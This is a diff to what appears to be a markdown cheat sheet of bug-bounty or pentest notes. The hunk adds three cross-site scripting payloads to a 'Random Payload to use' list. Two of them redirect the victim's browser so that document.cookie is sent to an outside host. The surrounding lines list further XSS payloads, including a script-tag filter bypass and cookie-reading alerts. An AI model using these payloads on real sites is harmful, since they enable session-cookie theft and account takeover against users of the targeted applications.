@@ -235,6 +235,9 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 
 #### Random Payload to use: 
 ```bash
+• "><xss/id="1"/tabindex="1"/style="font-size:%20100px"/autofocus/onfocusin="confirm%601%60">
+• "><xss/id="1"/tabindex="1"/style="font-size:%20100px"/autofocus/onfocusin="window.location.href='https://example.com?cookie='%2bdocument.cookie">
+• "><xss/id="1"/tabindex="1"/onfocusin="window.location.href='https://example.com?cookie='%2bdocument.cookie">
 • "><img src/onerror=prompt(document.cookie)>
 • "><img src=x onerror=alert(document.domain)> 
 • "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img"
